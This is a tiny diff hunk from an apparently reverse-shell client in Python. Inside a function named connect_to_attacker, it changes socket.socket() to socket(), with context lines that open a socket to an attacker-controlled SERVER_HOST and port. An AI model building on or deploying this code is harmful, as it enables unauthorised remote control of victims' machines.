@@ -95,7 +95,7 @@ def connect_to_attacker(SERVER_HOST):
 	SEPARATOR = "<sep>"
 	
 	# create the socket object
-	s = socket.socket()
+	s = socket()
 	# connect to the server
 	s.connect((SERVER_HOST, SERVER_PORT))
 	
